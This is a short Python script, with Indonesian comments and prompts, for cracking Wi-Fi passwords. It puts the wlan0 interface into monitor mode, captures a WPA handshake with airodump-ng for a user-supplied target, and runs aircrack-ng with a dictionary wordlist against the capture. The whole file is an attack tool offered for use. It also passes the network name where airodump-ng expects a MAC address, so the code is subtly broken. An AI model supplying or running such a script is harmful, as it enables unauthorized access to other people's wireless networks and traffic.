#!/usr/bin/env python3
import os
import subprocess

def start_wifi_hack(ssid, dictionary_file):
    # Pastikan modul wlan0 tersedia dan akses point mode
    os.system("sudo ifconfig wlan0 down")
    os.system("sudo iwconfig wlan0 mode monitor")
    os.system("sudo ifconfig wlan0 up")
    
    # Tangkap handshake
    print(f"Mencari handshake untuk {ssid}...")
    subprocess.call(["sudo", "airodump-ng", "-c", "1", "--bssid", ssid, "-w", "capture", "wlan0"])
    
    # Pecahkan dengan dictionary
    print("Memulai cracking...")
    subprocess.call(["aircrack-ng", "-w", dictionary_file, "capture-01.cap"])

if __name__ == "__main__":
    target_ssid = input("Masukkan SSID WiFi: ")
    dict_path = input("Masukkan lokasi file dictionary (contoh: /sdcard/wordlist.txt): ")
    start_wifi_hack(target_ssid, dict_path)
